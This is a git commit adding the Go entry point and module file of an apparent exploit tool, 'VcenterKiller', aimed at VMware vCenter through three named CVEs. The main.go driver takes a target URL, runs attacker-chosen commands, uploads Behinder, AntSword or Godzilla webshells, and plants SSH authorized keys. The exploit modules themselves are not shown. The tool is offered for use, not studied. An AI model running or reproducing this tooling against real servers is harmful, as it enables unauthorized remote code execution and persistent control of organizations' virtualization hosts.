44c7e5835522ebdc32b632bd608a929a6b68f798
root <root@192.168.1.5>
2022-10-04 11:59:28 +0800

    init

---
+++ go.mod
@@ -0,0 +1,31 @@
+module GO_VCENTER
+
+go 1.18
+
+require (
+	github.com/buger/jsonparser v1.1.1 // indirect
+	github.com/cheekybits/genny v1.0.0 // indirect
+	github.com/fatih/color v1.13.0 // indirect
+	github.com/fsnotify/fsnotify v1.5.4 // indirect
+	github.com/go-task/slim-sprig v0.0.0-20210107165309-348f09dbbbc0 // indirect
+	github.com/hashicorp/errwrap v1.1.0 // indirect
+	github.com/hashicorp/go-multierror v1.1.1 // indirect
+	github.com/imroc/req/v3 v3.24.0 // indirect
+	github.com/lucas-clemente/quic-go v0.28.1 // indirect
+	github.com/marten-seemann/qpack v0.2.1 // indirect
+	github.com/marten-seemann/qtls-go1-16 v0.1.5 // indirect
+	github.com/marten-seemann/qtls-go1-17 v0.1.2 // indirect
+	github.com/marten-seemann/qtls-go1-18 v0.1.2 // indirect
+	github.com/marten-seemann/qtls-go1-19 v0.1.0-beta.1 // indirect
+	github.com/mattn/go-colorable v0.1.9 // indirect
+	github.com/mattn/go-isatty v0.0.14 // indirect
+	github.com/nxadm/tail v1.4.8 // indirect
+	github.com/onsi/ginkgo v1.16.5 // indirect
+	golang.org/x/crypto v0.0.0-20220722155217-630584e8d5aa // indirect
+	golang.org/x/mod v0.6.0-dev.0.20220419223038-86c51ed26bb4 // indirect
+	golang.org/x/net v0.0.0-20220802222814-0bcc04d9c69b // indirect
+	golang.org/x/sys v0.0.0-20220731174439-a90be440212d // indirect
+	golang.org/x/text v0.3.7 // indirect
+	golang.org/x/tools v0.1.12 // indirect
+	gopkg.in/tomb.v1 v1.0.0-20141024135613-dd632973f1e7 // indirect
+)
---
+++ main.go
@@ -0,0 +1,81 @@
+package main
+
+import (
+	"GO_VCENTER/src/c_21972"
+	"GO_VCENTER/src/c_21985"
+	"GO_VCENTER/src/c_22005"
+	"flag"
+	"fmt"
+	"os"
+)
+
+var (
+	h        bool
+	url      string
+	filename string
+	cve      string
+	command  string
+	proxy    string
+	exp_type string
+)
+
+func usage() {
+	fmt.Println(`Usage of main.exe:
+	-u string
+		  you target, example: https://192.168.1.1
+	-m string
+		  you selected cve code, example: 21972 or 22205 or 21985
+	-c string
+		  you want execute command, example: "whoami"
+	-f string
+		  to upload webshell, expamle: behinder.jsp or antsword.jsp or gozllia.jsp 
+	-t string
+		  for CVE-2021-21972, use "ssh" to get ssh shell, not webshell`)
+}
+
+func banner() {
+	ban := `
+			__     __             _              _  ___ _ _
+			\ \   / /__ ___ _ __ | |_ ___ _ __  | |/ (_) | | ___ _ __
+			 \ \ / / __/ _ \ '_ \| __/ _ \ '__| | ' /| | | |/ _ \ '__|
+	  		  \ V / (_|  __/ | | | ||  __/ |    | . \| | | |  __/ |
+	   		   \_/ \___\___|_| |_|\__\___|_|    |_|\_\_|_|_|\___|_|       by schira4396
+			   `
+	fmt.Println(ban)
+}
+
+func main() {
+	flag.StringVar(&url, "u", "", "your target")
+	flag.StringVar(&filename, "f", "", "filename")
+	flag.StringVar(&cve, "m", "", "select cve")
+	flag.StringVar(&command, "c", "", "command")
+	flag.StringVar(&exp_type, "t", "", "CVE-2021-21972 Module")
+	flag.Usage = usage
+	flag.Parse()
+	banner()
+	if len(os.Args) == 1 {
+		usage()
+		os.Exit(0)
+	}
+	fmt.Println("[*] url: " + url)
+	switch cve {
+	case "22205":
+		{
+			c_22005.Test(url, filename)
+		}
+	case "21985":
+		{
+			c_21985.Attack(url, command)
+		}
+	case "21972":
+		{
+			if exp_type == "ssh" {
+				c_21972.Upload_ssh_authorized_keys(url, filename)
+			} else {
+				c_21972.Upload_windows_shell(url, filename)
+				c_21972.Upload_linux_shell(url, filename)
+			}
+		}
+	}
+
+}
